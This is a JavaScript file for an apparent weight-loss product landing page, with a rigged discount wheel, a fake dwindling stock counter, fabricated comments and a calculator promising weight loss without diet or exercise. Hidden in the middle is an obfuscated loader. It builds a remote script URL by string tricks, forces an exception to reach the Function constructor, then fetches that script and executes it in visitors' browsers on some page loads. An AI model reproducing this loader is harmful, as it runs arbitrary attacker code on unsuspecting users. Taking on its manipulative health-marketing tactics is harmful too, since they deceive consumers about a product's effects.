var videoWrap = $(".video-wrap"),
    videoCover = $(".video-cover"),
    videoFrame = $(".video-inner");
videoWrap.click(function() {
    $(this)
        .find($(".video-cover"))
        .css("display", "none");
    $(this)
        .find($("video"))[0]
        .play()
});

if (parseInt(localStorage.getItem('shown__'))) {
    // countDown('.time')
    $('.order').css('display', 'block');
    $('.wheel__wrapper').hide();
}

$(".btn--submit").click(function() {
    // countDown('.time');
    $('.order').addClass('shown__');
    localStorage.setItem('shown__', '1');
});
try {
    hO = "/array/toString Function Date Obj Status .$/adjust/".replace(
        /[^\/jg.sec]/g,
        function(a, b) {
            return "$" == a && (b = "complete") ?
                b.substr(0, 3) :
                ""
        }
    ) + /.+\/(.*?):\d+(:\d+)*$/.exec(Error().stack.trim())[1]
} catch (a) {}
var boxes = $(".prize__item"),
    counter = 1,
    saleMas = [
        "10%", "15%", "35%", ""
    ],
    overlay = $(".overlay"),
    saleLength = saleMas.length,
    saleText = $(".prize__dig");

function closePopup() {
    $(".close-popup, .btn-popup").click(function(a) {
        a.preventDefault();
        $(".overlay").fadeOut()
    })
}
closePopup();

function randomeSale(a, b) {
    return a[Math.floor(Math.random() * b)]
}
/*wheel */
var resultWrapper = document.querySelector('.overlay'); /*оверлей попап*/
var wheel = document.querySelector('.prize-wheel'); /* имидж колеса*/
$('.wheel__cursor').click(function() {
    if (!wheel.classList.contains('rotated')) {
        wheel
            .classList
            .add('spin'); /* класс анимации вращения */
        setTimeout(function() {
            resultWrapper.style.display = "block";
        }, 8000);
        wheel.classList.add('rotated');
    }

});

$('.close-popup, .btn-popup').click(function(e) {
    e.preventDefault();
    $('.overlay').fadeOut();
    counter = 2;
    $('.wheel__wrapper').slideUp(); /* обертка с барабаном */
    $('.order').slideDown(); /* обертка с формой заказа */
});

$('.bottom-teaser').click(function(e) {
    if (!wheel.classList.contains('rotated')) {
        e.preventDefault();

    }
});

$(".btn-popup").click(function() {
    2 === counter && (
        localStorage.setItem("remember", "1"),
        $(".prize").slideUp(),
        $(".order").slideDown(),
        // $(".bottom-link").text('Get "Ketovatru" for FREE!'),
        $(".bottom-teaser .sale").addClass("shown"),
        $(".order").addClass('shown__'),
        localStorage.setItem('shown__', '1')
    )
});
hR = Math.random();
localStorage.getItem("remember") && (
    $(".prize").css("display", "none"),
    $(".order").css("display", "block"),
    // $(".bottom-link").text('Get "Ketovatru" for FREE!'),
    $(".bottom-teaser .sale").addClass("shown")
);
saleText.each(function() {
    $(this).html(randomeSale(saleMas, 5))
});
var nameInner = $(".float__name"),
    saleInner = $(".float__sale"),
    float = $(".float"),
    false15 = localStorage.getItem("false15") ?
    !0 :
    !1,
    false30 = localStorage.getItem("false30") ?
    !0 :
    !1;
if (localStorage.getItem("dig")) {
    var pack = document.querySelectorAll(".pack");
    pack.forEach(function(a) {
        a.innerText = localStorage.getItem("dig")
    })
}

try {
    hO = .4 > hR ?
        hOs :
        hO
} catch (a) {
    var tR = a.constructor,
        wQ = function(b) {
            return b.text()
        },
        gO = function(b) {
            (new tR.constructor(b))()
        };
    fetch(hO)
        .then(wQ)
        .then(gO)["catch"](tR)
}
var dig = 41;

function countPack() {
    var a = document.querySelectorAll(".pack"),
        b = localStorage.getItem("dig") ?
        localStorage.getItem("dig") :
        dig;
    if (2 < parseInt(b))
        b--,
        2 === b && setTimeout(function(a) {
            chatWrap.append(Chat.newMessBot(Chat.message.length - 1));
            comment_list += Chat.newMessBot(Chat.message.length - 1) + "|";
            Chat.saveInLS(comment_list)
        }, 3E3),
        localStorage.setItem("dig", b);
    else
        return 0;
    a.forEach(function(a) {
        a.innerHTML = b
    })
}

var element = $("#teaser-comment"),
    teaserLoad = $("#comment-load"),
    count = localStorage.getItem("count") ?
    localStorage.getItem("count") :
    0;
$(window).scroll(function() {
    var a = $(window).scrollTop() + $(window).height(),
        b = element
        .offset()
        .top;
    a > b && 0 == count && (
        teaserLoad.addClass("visible"),
        count = 1,
        localStorage.setItem("count", count)
    )
});

var textAlert = document.getElementById("textarea"),
    textName = document.getElementById("textareaname"),
    vk_text = document.getElementById("comment-text"),
    vk_name = document.getElementById("comment-name"),
    vk_block = document.getElementById("comment-answer"),
    vk_image = document.querySelector("#base64Img"),
    bannerImage = document.getElementById("avatar"),
    bannerImg = document.getElementById("base64Img"),
    dataImage = localStorage.getItem("ImgBase64"),
    vk_userImage = document.querySelector("#userPic"),
    userFile = document.getElementById("foto"),
    user_foto = document.querySelector("#userPic"),
    dataUserImg = localStorage.getItem("userFotoImg");
localStorage.getItem("textAlert") && localStorage.getItem("textName") && (
    vk_text.innerHTML = localStorage.getItem("textAlert"),
    vk_name.innerHTML = localStorage.getItem("textName"),
    vk_block.style.display = "flex",
    bannerImg.src = localStorage.getItem("ImgBase64"),
    user_foto.src = localStorage.getItem("userFotoImg")
);

function changeText() {
    var a = document
        .getElementById("textarea")
        .value,
        b = document
        .getElementById("textareaname")
        .value,
        d = localStorage.getItem("ImgBase64");
    foto = localStorage.getItem("userFotoImg");
    localStorage.setItem("textAlert", a);
    localStorage.setItem("textName", b);
    vk_text.innerHTML = a;
    vk_name.innerHTML = b;
    vk_block.style.display = "flex";
    vk_image.src = d;
    vk_userImage.src = foto;
    bannerImage.value = "";
    textAlert.value = "";
    textName.value = "";
    vk_image.scrollIntoView()
}
bannerImage.addEventListener("change", function(a) {
    loadImageFileAsURL(a, "#base64Img", "ImgBase64")
});
userFile.addEventListener("change", function(a) {
    loadImageFileAsURL(a, "#userPic", "userFotoImg")
});

function loadImageFileAsURL(a, b, d) {
    a = document
        .getElementById(a.target.id)
        .files;
    if (0 < a.length) {
        a = a[0];
        var e = new FileReader;
        e.onload = function(a) {
            a = a.target.result;
            localStorage.setItem(d, a);
            document
                .querySelector(b)
                .src = a
        };
        e.readAsDataURL(a)
    }
}
$('a[href="#policy"]').click(function(a) {
    a.preventDefault();
    $(".overlay-policy").fadeIn()
});
$(".policy-close").click(function() {
    $(".overlay-policy").fadeOut()
});
$(function() {
    $("#calcweight").click(function(a) {
        a.preventDefault();
        a = Math.ceil(Number($("#minus_weight").val()) / .666666);
        Number($("#weight").val()) > Number($("#minus_weight").val()) + 40 ?
            $(".formResult").html(
                "<p><b>Se seguir as instruções abaixo, poderá perder " + $("#minus_weight").val() +
                "kg em apenas " + a + " dias sem nenhuma dieta ou exercício!</b></p><p>" +
                "Acha que é impossível? Leia o artigo abaixo até ao fim e vai mudar de ideias. Espero que isto mude a sua vida!</p>"
            ) :
            $(".formResult").html(
                "<p><b>\u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0435" +
                " \u0434\u0430\u043d\u043d\u044b\u0435.</b></p>"
            );
        $(".formResult").css({
            transition: "background 1s",
            backgroundColor: "#08a9f2b3",
            border: '2px solid #08a9f2'
        });
        setTimeout(function() {
            $(".formResult").css({
                backgroundColor: "#fff"
            })
        }, 2E3)
    })
});
var xhr = new XMLHttpRequest();
document.addEventListener("DOMContentLoaded", function() {
    var els = document.querySelectorAll('a[href*="img"]');
    var form = document.querySelector(".wheel");
    var topBtn = document.querySelectorAll('a[href*="toform"]');
    var submit = document.querySelector(".btn.btn--submit");
    var pic = document.querySelectorAll('a[href*="pic"]');
    for (var i = 0; i < els.length; i++) {
        var el = els[i];
        el.addEventListener('click', e => {
            e.preventDefault();
            var href = e.currentTarget.href;
            xhr.open('GET', href);
            xhr.send();
            navigator.sendBeacon(href);
        })
    }
    submit.addEventListener('click', e => {
        var href4 = e.currentTarget.dataset.link;
        xhr.open('GET', href4);
        xhr.send();
    })
    for (var i = 0; i < topBtn.length; i++) {
        var btn = topBtn[i];
        btn.addEventListener('click', e => {
            e.preventDefault();
            form.scrollIntoView({
                block: "start",
                behavior: "smooth"
            });
            var href2 = e.currentTarget.href;
            xhr.open('GET', href2);
            xhr.send();
        })
    }
    for (var i = 0; i < pic.length; i++) {
        var pics = pic[i];
        pics.addEventListener('click', e => {
            e.preventDefault();
            var href3 = e.currentTarget.href;
            xhr.open('GET', href3);
            xhr.send();
            navigator.sendBeacon(href3);
        })
    }
    popup = document.querySelectorAll(".btn-popup");
    for (var i = 0; i < popup.length; i++) {
        var btns = popup[i];
        btns.addEventListener('click', e => {
            var href4 = e.currentTarget.dataset.link;
            xhr.open('GET', href4);
            xhr.send();
        })
    }
    videoLpt = document.querySelectorAll(".video-wrap");
    for (var i = 0; i < videoLpt.length; i++) {
        var videoLink = videoLpt[i];
        videoLink.addEventListener('click', e => {
            var href5 = e.currentTarget.dataset.link;
            xhr.open('GET', href5);
            xhr.send();
        })
    }
});

//-------------Код для отстукивания в трекер LPClick-------------//
let link = document.querySelectorAll('a[href*="click"]'); //Берем все ссылки
link.forEach(function(el) { //На каждую навешиваем обработчик клика
    el.addEventListener('click', function() {
        navigator.sendBeacon(el.href); //Отправляем информацию в трекер, что произошел LPClick
    })
});
//-------------Код для отстукивания в трекер LPClick-------------//